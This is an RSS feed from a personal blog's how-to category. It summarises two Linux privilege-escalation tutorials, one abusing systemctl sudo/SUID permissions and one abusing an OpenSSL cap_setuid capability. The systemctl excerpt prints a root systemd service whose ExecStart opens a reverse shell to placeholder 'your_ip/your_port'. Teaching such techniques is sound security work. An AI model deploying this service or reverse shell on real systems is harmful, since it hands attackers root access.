<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>how-to on Tanishq Chaudhary</title>
    <link>https://chaudhary1337.github.io/categories/how-to/</link>
    <description>Recent content in how-to on Tanishq Chaudhary</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 03 Jul 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://chaudhary1337.github.io/categories/how-to/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>How-to: systemctl misconfiguration exploit</title>
      <link>https://chaudhary1337.github.io/p/how-to-systemctl-misconfiguration-exploit/</link>
      <pubDate>Sat, 03 Jul 2021 00:00:00 +0000</pubDate>
      
      <guid>https://chaudhary1337.github.io/p/how-to-systemctl-misconfiguration-exploit/</guid>
      <description>How-to: systemctl sudo/suid Exploit Explained 1. Requirements Case 0 You have the permissions to run /bin/systemctl as sudo or the SUID bit is set. This case is the easiest to deal with.
Case 1 Permissions (at least):
 /bin/systemctl daemon-reload /bin/systemctl restart *.service  Case 2 Permissions (at least):
 /bin/systemctl daemon-reload /bin/systemctl enable *.service -&amp;gt; /bin/systemctl start *.service  2. Code Case 0 and Case 1 root.service
[Unit] Description=pwn [Service] Type=simple User=root ExecStart=/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/your_ip/your_port 0&amp;gt;&amp;amp;1&#39; Case 0 and Case 2 root.</description>
    </item>
    
    <item>
      <title>How to: OpenSSL cap_setuid&#43;ep PrivEsc Exploit</title>
      <link>https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/</link>
      <pubDate>Thu, 17 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/</guid>
      <description>Consider the binary /usr/bin/openssl has capabilities set as: /usr/bin/openssl = cap_setuid+ep Is there a way to become root from a normal user by using this?
YES! Let&amp;rsquo;s explore how.
0. Checklist: Will It Work For Me? Search all the binaries&#39; capibilities using: getcap -r / 2&amp;gt;/dev/null.
 getcap is the tool we will use -r is the recursive flag 2&amp;gt;/dev/null directs the standard error stream to /dev/null  If you see /usr/bin/openssl = cap_setuid+ep, we are set for success.</description>
    </item>
    
  </channel>
</rss>
